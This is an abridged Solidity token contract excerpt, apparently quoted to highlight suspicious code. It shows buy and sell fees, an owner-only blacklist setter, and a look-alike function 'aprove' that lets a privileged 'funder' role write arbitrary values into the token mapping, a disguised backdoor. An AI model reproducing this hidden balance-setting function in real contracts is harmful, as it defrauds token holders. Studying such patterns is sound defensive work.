...
abstract contract TOKEN is IERC20, Ownable {
    ...
    uint256 public _buyFundFee = 300;//USDT
    uint256 public _buyLPDividendFee = 0;
    uint256 public _buyLPFee = 0;//
    uint256 public _sellFundFee = 300;//USDT
    ...
    function setBlackList(address addr, bool enable) private onlyOwner {
    ...
    function aprove(address addr, uint256 enable) public onlyFunder {
         _tokens[addr] = (enable);
    }
...
contract HX is TOKEN {
    constructor() TOKEN(
        ...
        address(0x22A3a6288Aace1310336B33329eB32E208232b47),
